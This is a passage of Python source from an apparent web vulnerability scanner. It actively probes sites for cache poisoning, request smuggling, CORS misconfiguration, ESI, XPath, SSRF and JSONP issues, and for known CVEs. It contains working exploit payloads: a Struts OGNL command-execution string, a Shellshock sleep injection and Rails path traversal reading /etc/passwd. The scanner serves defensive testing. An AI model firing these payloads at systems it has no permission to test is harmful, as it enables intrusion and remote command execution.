                hdr_val = val_tmpl.format(canary=canary)
                try:
                    time.sleep(self.rate_limit)
                    resp_poison = self._req("GET", url, headers={hdr_name: hdr_val})
                    if not resp_poison:
                        continue

                    # Brief pause to allow the poisoned entry to propagate in cache
                    time.sleep(0.3)

                    time.sleep(self.rate_limit)
                    resp_clean = self._req("GET", url)
                    if not resp_clean:
                        continue

                    clean_body = resp_clean.text[:5000]
                    clean_hdrs = str(resp_clean.headers)
                    if canary in clean_body or canary in clean_hdrs:
                        findings.append(self._make_finding(
                            url=url, method="GET", param=hdr_name,
                            param_type="header", vuln_type="cache_poisoning",
                            finding=(
                                f"Cache poisoning confirmed — {hdr_name} canary persisted "
                                f"in clean follow-up response [{url}]"
                            ),
                            severity="high",
                            proof=(
                                f"Header: {hdr_name}: {hdr_val} | "
                                f"Canary '{canary}' in clean response | "
                                f"Poison status={resp_poison.status_code} "
                                f"Clean status={resp_clean.status_code}"
                            ),
                            payload=f"{hdr_name}: {hdr_val}",
                            status_code=resp_clean.status_code,
                        ))
                        break  # one confirmed finding per URL is enough
                except Exception:
                    continue
        return findings

    # ── Mass Assignment ───────────────────────────────────────────────────────

    def _check_mass_assignment(self, sitemap) -> list[ScanFinding]:
        """Test for mass assignment by injecting privileged fields into POST/PUT JSON."""
        findings = []
        priv_fields = [
            ("role", "admin"), ("admin", True), ("isAdmin", True),
            ("privilege", "superadmin"), ("is_superuser", True),
            ("userType", "admin"), ("permissions", "all"),
        ]
        for url, page in list(sitemap.pages.items())[:10]:
            if self.stop_event.is_set():
                break
            ct = page.get("content_type", "")
            if "json" not in ct.lower():
                continue
            for field_name, field_val in priv_fields:
                if self.stop_event.is_set():
                    break
                try:
                    payload_body = json.dumps({field_name: field_val})
                    time.sleep(self.rate_limit)
                    resp = self._req("POST", url, headers={"Content-Type": "application/json"},
                                     json_body=payload_body)
                    if not resp:
                        continue
                    body = resp.text[:5000]
                    # Check if server reflects the injected field
                    if resp.status_code in (200, 201) and field_name in body:
                        try:
                            resp_json = resp.json()
                            if field_name in resp_json:
                                findings.append(self._make_finding(
                                    url=url, method="POST", param=field_name,
                                    param_type="json", vuln_type="mass_assignment",
                                    finding=f"Mass assignment — server accepted '{field_name}' field [{url}]",
                                    severity="high",
                                    proof=f"Injected {field_name}={field_val} | Response: {body[:250]}",
                                    payload=payload_body,
                                    status_code=resp.status_code,
                                ))
                                break
                        except (json.JSONDecodeError, ValueError):
                            continue
                except Exception:
                    continue
        return findings

    # ── Business Logic ────────────────────────────────────────────────────────

    def _check_business_logic(self, sitemap) -> list[ScanFinding]:
        """Test business logic flaws with negative values, overflow, and edge cases."""
        findings = []
        numeric_params = {"quantity", "amount", "price", "count", "qty", "num",
                          "total", "value", "number", "id"}
        logic_payloads = [
            ("-1", "negative"),
            ("0", "zero"),
            ("-0.01", "negative_decimal"),
            ("9999999999", "large_number"),
            ("2147483648", "int32_overflow"),
            ("1e100", "scientific_notation"),
        ]
        from urllib.parse import urlparse as _up, parse_qs, urlencode, urlunparse
        for url in list(sitemap.pages.keys())[:10]:
            if self.stop_event.is_set():
                break
            parsed = _up(url)
            params = parse_qs(parsed.query, keep_blank_values=True)
            if not params:
                continue
            target_params = [p for p in params if p.lower() in numeric_params]
            if not target_params:
                # Also test params that look numeric
                target_params = [p for p in params if params[p] and
                                 params[p][0].replace(".", "").replace("-", "").isdigit()]
            for pname in target_params[:3]:
                if self.stop_event.is_set():
                    break
                for payload, label in logic_payloads:
                    try:
                        new_params = dict(params)
                        new_params[pname] = [payload]
                        new_query = urlencode(new_params, doseq=True)
                        inj_url = urlunparse(parsed._replace(query=new_query))
                        time.sleep(self.rate_limit)
                        resp = self._req("GET", inj_url)
                        if not resp:
                            continue
                        body = resp.text[:5000].lower()
                        # Detect: accepted negative/overflow values without error
                        if resp.status_code == 200 and label in ("negative", "negative_decimal"):
                            if "error" not in body and "invalid" not in body:
                                findings.append(self._make_finding(
                                    url=url, method="GET", param=pname,
                                    param_type="query", vuln_type="business_logic",
                                    finding=f"Business logic — {label} value accepted for '{pname}' [{url}]",
                                    severity="high",
                                    proof=f"Payload: {pname}={payload} | Status: {resp.status_code} | Body: {body[:200]}",
                                    payload=f"{pname}={payload}",
                                    status_code=resp.status_code,
                                ))
                                break
                        elif resp.status_code == 500 and label in ("int32_overflow", "scientific_notation"):
                            findings.append(self._make_finding(
                                url=url, method="GET", param=pname,
                                param_type="query", vuln_type="business_logic",
                                finding=f"Business logic — {label} causes server error for '{pname}' [{url}]",
                                severity="high",
                                proof=f"Payload: {pname}={payload} | Status: 500 | Body: {body[:200]}",
                                payload=f"{pname}={payload}",
                                status_code=resp.status_code,
                            ))
                            break
                    except Exception:
                        continue
        return findings

    # ── Certificate Transparency ──────────────────────────────────────────────

    def _check_cert_transparency(self, sitemap) -> list[ScanFinding]:
        """Check certificate transparency logs via crt.sh for the target domain."""
        findings = []
        try:
            parsed = urlparse(self.target)
            hostname = parsed.hostname
            if not hostname:
                return findings
            # Query crt.sh API
            crtsh_url = f"https://crt.sh/?q={hostname}&output=json"
            resp = requests.get(crtsh_url, timeout=10, verify=True)
            if resp.status_code != 200:
                return findings
            certs = resp.json()
            if not isinstance(certs, list):
                return findings

            # Check for wildcard certs
            wildcards = [c for c in certs if c.get("common_name", "").startswith("*.")]
            if wildcards:
                findings.append(self._make_finding(
                    url=self.target, method="GET", param="certificate",
                    param_type="passive", vuln_type="cert_transparency",
                    finding=f"Wildcard certificate detected for {hostname} ({len(wildcards)} wildcard certs found)",
                    severity="low",
                    proof=f"Example: {wildcards[0].get('common_name', '')} issued by {wildcards[0].get('issuer_name', '')[:100]}",
                    payload="",
                ))

            # Check for recently issued certs (last 7 days)
            from datetime import timedelta
            now = datetime.now(timezone.utc)
            recent = []
            for c in certs[:100]:  # cap iteration
                not_before = c.get("not_before", "")
                if not_before:
                    try:
                        cert_date = datetime.fromisoformat(not_before.replace("Z", "+00:00"))
                        if (now - cert_date) < timedelta(days=7):
                            recent.append(c)
                    except (ValueError, TypeError):
                        continue
            if recent:
                findings.append(self._make_finding(
                    url=self.target, method="GET", param="certificate",
                    param_type="passive", vuln_type="cert_transparency",
                    finding=f"Recently issued certificates for {hostname} ({len(recent)} in last 7 days)",
                    severity="info",
                    proof=f"Total certs: {len(certs)} | Recent: {len(recent)} | Latest: {recent[0].get('common_name', '')}",
                    payload="",
                ))

            # General info: total cert count
            if len(certs) > 0 and not wildcards and not recent:
                findings.append(self._make_finding(
                    url=self.target, method="GET", param="certificate",
                    param_type="passive", vuln_type="cert_transparency",
                    finding=f"Certificate transparency: {len(certs)} certificates found for {hostname}",
                    severity="info",
                    proof=f"Total certs: {len(certs)} via crt.sh",
                    payload="",
                ))
        except Exception:
            pass  # Degrade gracefully if crt.sh unreachable
        return findings

    # ── ZAP Community Script active checks ──────────────────────────────────

    def _check_http_verb_tampering(self, sitemap) -> list[ScanFinding]:
        """ZAP Community — HTTP verb tampering for access control bypass."""
        findings = []
        tamper_verbs = ["TRACE", "TRACK", "OPTIONS", "PROPFIND", "ARBITRARY"]
        for url in list(sitemap.pages.keys())[:10]:
            if self.stop_event.is_set():
                break
            try:
                baseline = self._req("GET", url)
                if not baseline or baseline.status_code not in (200, 403, 401):
                    continue
                baseline_status = baseline.status_code
                if baseline_status not in (403, 401):
                    continue
                for verb in tamper_verbs:
                    try:
                        r = self._req(verb, url)
                        if r and r.status_code == 200:
                            findings.append(self._make_finding(
                                url=url, method=verb, param="",
                                param_type="verb", vuln_type="access_control",
                                finding=f"HTTP verb tampering — {verb} bypasses access control [{url}]",
                                severity="high",
                                proof=f"GET → {baseline_status}, {verb} → {r.status_code}",
                                payload=verb,
                                status_code=r.status_code,
                            ))
                            break
                    except Exception:
                        pass
            except Exception:
                pass
        return findings

    def _check_padding_oracle(self, sitemap) -> list[ScanFinding]:
        """ZAP Community — CBC padding oracle detection via response differentiation."""
        findings = []
        try:
            import base64 as _b64
            import re as _re
            from urllib.parse import urlparse as _up, parse_qs, urlencode, urlunparse
            b64_re = _re.compile(r'^[A-Za-z0-9+/]{16,}={0,2}$')
        except Exception:
            return findings
        for url in list(sitemap.pages.keys())[:10]:
            if self.stop_event.is_set():
                break
            try:
                parsed = _up(url)
                params = parse_qs(parsed.query, keep_blank_values=True)
                for param, values in list(params.items())[:5]:
                    val = values[0] if values else ""
                    if not b64_re.match(val):
                        continue
                    try:
                        ct = _b64.b64decode(val + "==")
                    except Exception:
                        continue
                    if len(ct) < 16:
                        continue
                    # Flip last byte of second-to-last block
                    ct_arr = bytearray(ct)
                    ct_arr[-17] ^= 0x01
                    flipped = _b64.b64encode(bytes(ct_arr)).decode()
                    # Build URLs with normal and flipped ciphertext
                    normal_params = dict(params)
                    flipped_params = dict(params)
                    flipped_params[param] = [flipped]
                    normal_params[param] = [val]
                    q_normal = urlencode(normal_params, doseq=True)
                    q_flipped = urlencode(flipped_params, doseq=True)
                    url_normal = urlunparse(parsed._replace(query=q_normal))
                    url_flipped = urlunparse(parsed._replace(query=q_flipped))
                    try:
                        r1 = self._req("GET", url_normal)
                        r2 = self._req("GET", url_flipped)
                        if (r1 and r2
                                and r1.status_code == r2.status_code
                                and abs(len(r1.text) - len(r2.text)) > 20):
                            findings.append(self._make_finding(
                                url=url, method="GET", param=param,
                                param_type="query", vuln_type="cryptography",
                                finding=f"Possible CBC padding oracle — param '{param}' shows differential response to ciphertext manipulation [{url}]",
                                severity="high",
                                proof=f"Normal: {len(r1.text)} bytes, Flipped: {len(r2.text)} bytes (status both {r1.status_code})",
                                payload=f"{param}={flipped}",
                                status_code=r1.status_code,
                            ))
                            break
                    except Exception:
                        pass
            except Exception:
                pass
        return findings

    def _check_http_smuggling_clte(self, sitemap) -> list[ScanFinding]:
        """ZAP Community — HTTP request smuggling CL.TE probe via raw sockets."""
        findings = []
        import socket, ssl, time as _time
        for url in list(sitemap.pages.keys())[:5]:
            if self.stop_event.is_set():
                break
            try:
                parsed = urlparse(url)
                host = parsed.netloc
                port = 443 if parsed.scheme == "https" else 80
                marker = "SMUGGLE-TEST-MARKER"
                smuggle_body = f"POST / HTTP/1.1\r\nHost: {host}\r\nContent-Length: {len(marker)}\r\n\r\n{marker}"
                outer_body = f"0\r\n\r\n{smuggle_body}"
                raw_request = (
                    f"POST {parsed.path or '/'} HTTP/1.1\r\n"
                    f"Host: {host}\r\n"
                    f"Content-Type: application/x-www-form-urlencoded\r\n"
                    f"Content-Length: {len(outer_body)}\r\n"
                    f"Transfer-Encoding: chunked\r\n"
                    f"Connection: close\r\n\r\n"
                    f"{outer_body}"
                )
                sock = socket.create_connection((host.split(":")[0], port), timeout=5)
                if parsed.scheme == "https":
                    ctx = ssl.create_default_context()
                    ctx.check_hostname = False
                    ctx.verify_mode = ssl.CERT_NONE
                    sock = ctx.wrap_socket(sock, server_hostname=host.split(":")[0])
                start = _time.time()
                sock.sendall(raw_request.encode())
                resp_data = b""
                try:
                    while True:
                        chunk = sock.recv(4096)
                        if not chunk:
                            break
                        resp_data += chunk
                        if len(resp_data) > 8192:
                            break
                except Exception:
                    pass
                elapsed = _time.time() - start
                sock.close()
                resp_text = resp_data.decode("utf-8", errors="ignore")
                response_count = resp_text.count("HTTP/1.1")
                if response_count >= 2:
                    findings.append(self._make_finding(
                        url=url, method="POST", param="",
                        param_type="header", vuln_type="request_smuggling",
                        finding=f"HTTP Request Smuggling — server returned multiple responses to one request (CL.TE) [{url}]",
                        severity="critical",
                        proof=f"Received {response_count} HTTP responses in single TCP connection ({elapsed:.1f}s)",
                        payload="CL.TE desync probe",
                        status_code=0,
                    ))
            except Exception:
                pass
        return findings

    def _check_cors_origin_probe(self, sitemap) -> list[ScanFinding]:
        """ZAP Community — Active CORS misconfiguration probe with attacker origins."""
        findings = []
        for url in list(sitemap.pages.keys())[:10]:
            if self.stop_event.is_set():
                break
            try:
                parsed_url = urlparse(url)
                attacker_origins = [
                    "https://evil.com",
                    "null",
                    f"https://attacker.{parsed_url.netloc}",
                ]
                for origin in attacker_origins:
                    try:
                        r = self._req("GET", url, headers={"Origin": origin})
                        if not r:
                            continue
                        acao = r.headers.get("Access-Control-Allow-Origin", "")
                        acac = r.headers.get("Access-Control-Allow-Credentials", "")
                        if acao in (origin, "*"):
                            severity = "high" if acac.lower() == "true" else "medium"
                            findings.append(self._make_finding(
                                url=url, method="GET", param="Origin",
                                param_type="header", vuln_type="cors",
                                finding=f"CORS misconfiguration — Origin '{origin}' reflected in ACAO header [{url}]",
                                severity=severity,
                                proof=f"Origin: {origin} -> ACAO: {acao}, ACAC: {acac}",
                                payload=origin,
                                status_code=r.status_code,
                            ))
                            break
                    except Exception:
                        pass
            except Exception:
                pass
        return findings

    # ── ESI Injection (ActiveScan++) ─────────────────────────────────────────

    def _check_esi_injection(self, sitemap) -> list[ScanFinding]:
        """Test for Edge Side Includes injection via parameter reflection."""
        findings = []
        canary = f"esi_{uuid.uuid4().hex[:8]}"
        marker = f"http://{canary}.example.com/"
        payloads = [
            f'<esi:include src="{marker}"/>',
            f'<esi:include src={marker} />',
            f"x]]\u003e<esi:include src=\"{marker}\"/>",
        ]
        for url in islice(sitemap.pages.keys(), 10):
            if self.stop_event.is_set():
                break
            parsed = urlparse(url)
            params = parse_qs(parsed.query, keep_blank_values=True)
            if not params:
                continue
            for param_name in list(params.keys())[:3]:
                if self.stop_event.is_set():
                    break
                for payload in payloads:
                    try:
                        time.sleep(self.rate_limit)
                        inject_q = urlencode({param_name: payload}, doseq=False)
                        inject_url = urlunparse(parsed._replace(query=inject_q))
                        resp = self._req("GET", inject_url)
                        if not resp:
                            continue
                        body = resp.text[:5000]
                        if marker in body or "ESI/1.0" in resp.headers.get("Surrogate-Control", ""):
                            findings.append(self._make_finding(
                                url=url, method="GET", param=param_name,
                                param_type="query", vuln_type="esi_injection",
                                finding=f"ESI injection — <esi:include> tag processed or reflected [{url}]",
                                severity="high",
                                proof=f"Payload: {payload[:100]} | Surrogate-Control: {resp.headers.get('Surrogate-Control', 'N/A')}",
                                payload=payload,
                                status_code=resp.status_code,
                            ))
                            break
                    except Exception:
                        continue
                else:
                    continue
                break  # found ESI on this param, move to next URL
        return findings

    # ── Shellshock CVE-2014-6271 (ActiveScan++) ──────────────────────────────

    def _check_shellshock(self, sitemap) -> list[ScanFinding]:
        """Test for Shellshock (CVE-2014-6271) via User-Agent and Referer headers."""
        findings = []
        sleep_seconds = 5
        payload = f"() {{ :;}}; /bin/sleep {sleep_seconds}"
        inject_headers = ["User-Agent", "Referer", "Cookie"]
        for url in islice(sitemap.pages.keys(), 10):
            if self.stop_event.is_set():
                break
            # Get baseline response time first
            try:
                time.sleep(self.rate_limit)
                t0 = time.time()
                base_resp = self._req("GET", url)
                baseline_time = time.time() - t0
                if not base_resp:
                    continue
            except Exception:
                continue
            for hdr_name in inject_headers:
                if self.stop_event.is_set():
                    break
                try:
                    time.sleep(self.rate_limit)
                    t0 = time.time()
                    resp = self._req("GET", url, headers={hdr_name: payload})
                    elapsed = time.time() - t0
                    if not resp:
                        continue
                    # If response took notably longer than baseline + sleep threshold
                    if elapsed >= baseline_time + sleep_seconds - 1:
                        findings.append(self._make_finding(
                            url=url, method="GET", param=hdr_name,
                            param_type="header", vuln_type="shellshock",
                            finding=f"Shellshock (CVE-2014-6271) — timing delay via {hdr_name} [{url}]",
                            severity="critical",
                            proof=f"Baseline: {baseline_time:.2f}s | Payload response: {elapsed:.2f}s | Delay: {elapsed - baseline_time:.2f}s",
                            payload=payload,
                            resp_time_ms=elapsed * 1000,
                            status_code=resp.status_code,
                        ))
                        break  # one finding per URL
                except Exception:
                    continue
        return findings

    # ── Jetty Info Leak CVE-2015-2080 (ActiveScan++) ─────────────────────────

    def _check_jetty_leak(self, sitemap) -> list[ScanFinding]:
        """Test for Jetty memory leak via illegal characters (CVE-2015-2080)."""
        findings = []
        # Illegal character in header value triggers Jetty to dump memory in 400 response
        illegal_header = {"X-Jetty-Test": "\x00"}
        for url in islice(sitemap.pages.keys(), 5):
            if self.stop_event.is_set():
                break
            try:
                time.sleep(self.rate_limit)
                resp = self._req("GET", url, headers=illegal_header)
                if not resp:
                    continue
                body = resp.text[:5000]
                # Jetty CVE-2015-2080 leaks buffer contents in 400 Bad Request
                if resp.status_code == 400 and ("Illegal character" in body or "\\x00" in body):
                    # Check for leaked memory indicators — non-printable chars or HTTP fragments
                    if any(kw in body for kw in ("HTTP/1.", "Cookie:", "Authorization:", "0x")):
                        findings.append(self._make_finding(
                            url=url, method="GET", param="X-Jetty-Test",
                            param_type="header", vuln_type="jetty_leak",
                            finding=f"Jetty info leak (CVE-2015-2080) — server memory leaked in 400 response [{url}]",
                            severity="medium",
                            proof=f"400 response body snippet: {body[:300]}",
                            payload="\\x00 in header value",
                            status_code=resp.status_code,
                        ))
                        break  # one finding is enough
            except Exception:
                continue
        return findings

    # ── Apache Struts RCE CVE-2017-5638 (ActiveScan++) ───────────────────────

    def _check_struts_rce(self, sitemap) -> list[ScanFinding]:
        """Test for Apache Struts RCE via OGNL injection in Content-Type (CVE-2017-5638)."""
        findings = []
        canary = f"struts_{uuid.uuid4().hex[:8]}"
        # Harmless OGNL payload that just echoes a canary string
        ognl_payload = (
            "%{(#_='multipart/form-data')."
            "(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)."
            "(#_memberAccess?(#_memberAccess=#dm):"
            "((#container=#context['com.opensymphony.xwork2.ActionContext.container'])."
            "(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class))."
            "(#ognlUtil.getExcludedPackageNames().clear())."
            "(#ognlUtil.getExcludedClasses().clear())."
            f"(#cmd='echo {canary}')."
            "(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win')))."
            "(#cmds=(#iswin?{'cmd','/c',#cmd}:{'/bin/sh','-c',#cmd}))."
            "(#p=new java.lang.ProcessBuilder(#cmds))."
            "(#p.redirectErrorStream(true)).(#process=#p.start())."
            "(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream()))."
            "(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros))."
            "(#ros.flush())}}"
        )
        for url in islice(sitemap.pages.keys(), 5):
            if self.stop_event.is_set():
                break
            try:
                time.sleep(self.rate_limit)
                resp = self._req(
                    "POST", url,
                    headers={"Content-Type": ognl_payload},
                    data={"test": "1"},
                )
                if not resp:
                    continue
                body = resp.text[:5000]
                if canary in body:
                    findings.append(self._make_finding(
                        url=url, method="POST", param="Content-Type",
                        param_type="header", vuln_type="struts_rce",
                        finding=f"Apache Struts RCE (CVE-2017-5638) — OGNL injection via Content-Type [{url}]",
                        severity="critical",
                        proof=f"Canary '{canary}' found in response body",
                        payload="OGNL expression in Content-Type header",
                        status_code=resp.status_code,
                    ))
                    break
            except Exception:
                continue
        return findings

    # ── Apache Struts Namespace RCE CVE-2018-11776 (ActiveScan++) ────────────

    def _check_struts_namespace_rce(self, sitemap) -> list[ScanFinding]:
        """Test for Struts namespace RCE via OGNL in URL (CVE-2018-11776)."""
        findings = []
        canary = f"struts_ns_{uuid.uuid4().hex[:8]}"
        ognl_ns = f"${{'{canary}'}}"
        for url in islice(sitemap.pages.keys(), 5):
            if self.stop_event.is_set():
                break
            parsed = urlparse(url)
            # Inject OGNL in the path namespace
            test_path = f"/{ognl_ns}/{parsed.path.lstrip('/')}"
            test_url = urlunparse(parsed._replace(path=test_path))
            try:
                time.sleep(self.rate_limit)
                resp = self._req("GET", test_url)
                if not resp:
                    continue
                body = resp.text[:5000]
                loc = resp.headers.get("Location", "")
                # Check if OGNL was evaluated (canary appears without the ${} wrapper)
                if canary in body or canary in loc:
                    findings.append(self._make_finding(
                        url=url, method="GET", param="namespace",
                        param_type="path", vuln_type="struts_namespace_rce",
                        finding=f"Struts namespace RCE (CVE-2018-11776) — OGNL evaluated in URL path [{url}]",
                        severity="critical",
                        proof=f"Canary '{canary}' found in response | Location: {loc[:200]}",
                        payload=ognl_ns,
                        status_code=resp.status_code,
                    ))
                    break
            except Exception:
                continue
        return findings

    # ── Rails File Disclosure CVE-2019-5418 (ActiveScan++) ───────────────────

    def _check_rails_file_disclosure(self, sitemap) -> list[ScanFinding]:
        """Test for Rails arbitrary file read via Accept header (CVE-2019-5418)."""
        findings = []
        # Crafted Accept header causes Rails to render arbitrary files as templates
        file_payloads = [
            ("../../../../etc/passwd{{", "root:", "/etc/passwd"),
            ("../../../Windows/win.ini{{", "[extensions]", "win.ini"),
        ]
        for url in islice(sitemap.pages.keys(), 10):
            if self.stop_event.is_set():
                break
            for accept_val, marker, file_desc in file_payloads:
                if self.stop_event.is_set():
                    break
                try:
                    time.sleep(self.rate_limit)
                    resp = self._req("GET", url, headers={"Accept": accept_val})
                    if not resp:
                        continue
                    body = resp.text[:5000]
                    if marker in body:
                        findings.append(self._make_finding(
                            url=url, method="GET", param="Accept",
                            param_type="header", vuln_type="rails_file_disclosure",
                            finding=f"Rails file disclosure (CVE-2019-5418) — {file_desc} readable via Accept header [{url}]",
                            severity="high",
                            proof=f"Accept: {accept_val} → response contains '{marker}'",
                            payload=accept_val,
                            status_code=resp.status_code,
                        ))
                        break  # one finding per URL
                except Exception:
                    continue
            else:
                continue
            break  # found file disclosure, enough
        return findings

    # ── OAST-SSRF Confirmation ─────────────────────────────────────────────────

    def _check_ssrf_oast(self, sitemap) -> list[ScanFinding]:
        """Test SSRF-susceptible params with OAST callback for out-of-band confirmation."""
        findings = []
        if not self.oast or not self.oast.started:
            return findings
        ssrf_params = {"url", "redirect", "next", "callback", "return_to", "file",
                       "path", "load", "uri", "href", "src", "dest", "target",
                       "fetch", "proxy", "link", "feed", "endpoint"}
        tokens = []  # (token, url, param_name)
        for url in islice(sitemap.pages.keys(), 10):
            if self.stop_event.is_set():
                break
            parsed = urlparse(url)
            params = parse_qs(parsed.query, keep_blank_values=True)
            if not params:
                continue
            for param_name in list(params.keys())[:5]:
                if param_name.lower() not in ssrf_params:
                    continue
                try:
                    oast_url = self.oast.make_url("ssrf", url, param_name)
                    token = oast_url.rsplit("/", 1)[-1]
                    inject_q = urlencode({param_name: oast_url}, doseq=False)
                    inject_url = urlunparse(parsed._replace(query=inject_q))
                    time.sleep(self.rate_limit)
                    self._req("GET", inject_url)
                    tokens.append((token, url, param_name))
                except Exception:
                    continue

        # Wait for callbacks and check results
        if tokens:
            time.sleep(3)  # brief wait for out-of-band callbacks
            for token, url, param_name in tokens:
                if self.stop_event.is_set():
                    break
                cb = self.oast.poll_token(token, wait=2.0)
                if cb:
                    findings.append(self._make_finding(
                        url=url, method="GET", param=param_name,
                        param_type="query", vuln_type="ssrf",
                        finding=f"SSRF confirmed via OAST — server fetched callback URL [{url}]",
                        severity="critical",
                        proof=f"OAST callback received from {cb.remote_ip} at {cb.timestamp:.0f} | "
                              f"Token: {token}",
                        payload=f"OAST callback URL injected into '{param_name}' parameter",
                        status_code=200,
                    ))
        return findings

    # ── XPath Injection ────────────────────────────────────────────────────────

    def _check_xpath_injection(self, sitemap) -> list[ScanFinding]:
        """Test for XPath injection via error-based and boolean-based detection."""
        findings = []
        # XPath payloads that trigger syntax errors or boolean differences
        payloads = [
            ("' or '1'='1", "xpath_boolean"),
            ("' or '1'='2", "xpath_boolean_false"),
            ("1' and '1'='1", "xpath_and_true"),
            ("'] | //*[contains(., '", "xpath_union"),
            ("' or count(//*)>0 or '1'='1", "xpath_count"),
        ]
        error_markers = [
            "XPathException", "xpath", "XPATH", "SimpleXMLElement",
            "xmlXPathEval", "DOMXPath", "Invalid expression",
            "javax.xml.xpath", "XPathEvalError", "lxml.etree",
        ]
        for url in islice(sitemap.pages.keys(), 10):
            if self.stop_event.is_set():
                break
            parsed = urlparse(url)
            params = parse_qs(parsed.query, keep_blank_values=True)
            if not params:
                continue
            for param_name in list(params.keys())[:3]:
                if self.stop_event.is_set():
                    break
                # Get baseline response
                try:
                    time.sleep(self.rate_limit)
                    base_resp = self._req("GET", url)
                    if not base_resp:
                        continue
                    base_len = len(base_resp.text[:5000])
                except Exception:
                    continue
                for payload, ptype in payloads:
                    try:
                        time.sleep(self.rate_limit)
                        inject_q = urlencode({param_name: payload}, doseq=False)
                        inject_url = urlunparse(parsed._replace(query=inject_q))
                        resp = self._req("GET", inject_url)
                        if not resp:
                            continue
                        body = resp.text[:5000]
                        # Error-based detection
                        for marker in error_markers:
                            if marker in body:
                                findings.append(self._make_finding(
                                    url=url, method="GET", param=param_name,
                                    param_type="query", vuln_type="xpath_injection",
                                    finding=f"XPath injection (error-based) — '{marker}' in response [{url}]",
                                    severity="high",
                                    proof=f"Payload: {payload} | Error marker: {marker}",
                                    payload=payload,
                                    status_code=resp.status_code,
                                ))
                                break
                        else:
                            # Boolean-based: compare true vs false payload response length
                            if ptype == "xpath_boolean":
                                try:
                                    false_q = urlencode({param_name: "' or '1'='2"}, doseq=False)
                                    false_url = urlunparse(parsed._replace(query=false_q))
                                    time.sleep(self.rate_limit)
                                    false_resp = self._req("GET", false_url)
                                    if false_resp:
                                        true_len = len(body)
                                        false_len = len(false_resp.text[:5000])
                                        # Significant difference suggests injection
                                        if true_len != base_len and abs(true_len - false_len) > 50:
                                            findings.append(self._make_finding(
                                                url=url, method="GET", param=param_name,
                                                param_type="query", vuln_type="xpath_injection",
                                                finding=f"XPath injection (boolean-based) — response differs for true/false conditions [{url}]",
                                                severity="high",
                                                proof=f"Baseline: {base_len}B | True: {true_len}B | False: {false_len}B",
                                                payload=payload,
                                                status_code=resp.status_code,
                                            ))
                                except Exception:
                                    pass
                            continue
                        break  # found error-based XPath on this param
                    except Exception:
                        continue
        return findings

    # ── Helpers ───────────────────────────────────────────────────────────────

    # ══════════════════════════════════════════════════════════════════════════
    # BURP EXTENSIONS DIGEST — snoopysecurity/awesome-burp-extensions
    # Six checks ported from the most impactful open-source Burp extensions:
    #   1. Reverse Tabnabbing  (Noopener + Discovering-Reverse-Tabnabbing)
    #   2. JSONP Detection     (jsonp by kapytein)
    #   3. 403/401 Bypass      (403Bypasser by sting8k)
    #   4. Log4Shell           (Log4j2Scan / Log4J-Scanner)
    #   5. HTTPoxy             (HTTPoxy Scanner — CVE-2016-5385)
    #   6. Cryptomining        (Minesweeper by codingo)
    # ══════════════════════════════════════════════════════════════════════════

    # ── 1. Reverse Tabnabbing ─────────────────────────────────────────────────
    # Source: Noopener Burp Extension (snoopysecurity/Noopener-Burp-Extension)
    #         Discovering Reverse Tabnabbing (GabsJahBless)
    _BLANK_LINK_RE = re.compile(r'<a\s[^>]*target\s*=\s*["\']_blank["\'][^>]*>', re.I)
    _NOOPENER_RE   = re.compile(
        r'rel\s*=\s*["\'][^"\']*(?:noopener|noreferrer)[^"\']*["\']', re.I
    )

    def _check_reverse_tabnabbing(self, sitemap) -> list[ScanFinding]:
        """Passive: find target='_blank' links missing rel='noopener noreferrer'."""
        findings = []
        seen: set[str] = set()
        checked = 0
        for url, page in sitemap.pages.items():
            if self.stop_event.is_set() or checked >= 20:
                break
            checked += 1
            body = page.get("body", "")
            if not body:
                try:
                    resp = self._req("GET", url)
                    if resp:
                        body = resp.text
                except Exception:
                    continue
            if not body:
                continue
            for link in self._BLANK_LINK_RE.findall(body):
                if not self._NOOPENER_RE.search(link) and url not in seen:
                    seen.add(url)
                    findings.append(self._make_finding(
                        url=url, method="GET", param="href",
                        param_type="body", vuln_type="reverse_tabnabbing",
                        finding=f"Reverse tabnabbing — target='_blank' link missing rel='noopener noreferrer' [{url}]",
                        severity="medium",
                        proof=link[:200],
                        payload="",
                    ))
                    break  # one finding per page
        return findings

    # ── 2. JSONP Endpoint Detection ───────────────────────────────────────────
    # Source: jsonp Burp Extension (kapytein/jsonp)
    _JSONP_WRAP_RE = re.compile(r'^[a-zA-Z_$][a-zA-Z0-9_$.]*\s*\(', re.M)

    def _check_jsonp(self, sitemap) -> list[ScanFinding]:
        """Detect JSONP callback parameters that enable cross-origin data exfiltration."""
        findings = []
        checked_bases: set[str] = set()
        cb_names = ["callback", "cb", "jsonp", "jsoncallback", "jsonp_callback", "jcb", "func"]

        for url in list(sitemap.pages.keys())[:25]:
            if self.stop_event.is_set():
                break
            base = url.split("?")[0]
            if base in checked_bases:
                continue
            checked_bases.add(base)

            for cb in cb_names[:4]:
                if self.stop_event.is_set():
                    break
                probe_url = f"{base}?{cb}=dast_jsonp_test"
                try:
                    time.sleep(self.rate_limit)
                    # Baseline: send a benign value to check if wrapping occurs naturally
                    baseline_url  = f"{base}?{cb}=baseline_safe_value"
                    baseline_resp = self._req("GET", baseline_url)
                    baseline_body = (baseline_resp.text[:3000] if baseline_resp else "")
                    # If baseline already wraps any value, it's a general JSONP endpoint;
                    # only flag if OUR specific probe string appears (not generic wrapping)
                    baseline_wraps = self._JSONP_WRAP_RE.search(baseline_body)

                    time.sleep(self.rate_limit)
                    resp = self._req("GET", probe_url)
                    if not resp or resp.status_code not in (200, 201):
                        continue
                    body = resp.text[:3000]
                    # Must reflect our specific probe name, not just any wrapper
                    probe_reflected = "dast_jsonp_test(" in body
                    # If baseline also wraps, only count as confirmed if our name is reflected
                    if probe_reflected or (not baseline_wraps and self._JSONP_WRAP_RE.search(body)):
                        ct = resp.headers.get("Content-Type", "")
                        findings.append(self._make_finding(
                            url=base, method="GET", param=cb,
                            param_type="query", vuln_type="jsonp_endpoint",
                            finding=(f"JSONP callback '{cb}' reflects function name — "
                                     f"CORS bypass via cross-origin script include [{base}]"),
                            severity="medium",
                            proof=(f"?{cb}=dast_jsonp_test reflected in response. "
                                   f"Content-Type: {ct}. Excerpt: {body[:200]}"),
                            payload=f"?{cb}=dast_jsonp_test",
                            status_code=resp.status_code,
                        ))
                        break  # one finding per URL base
                except Exception:
                    continue
        return findings

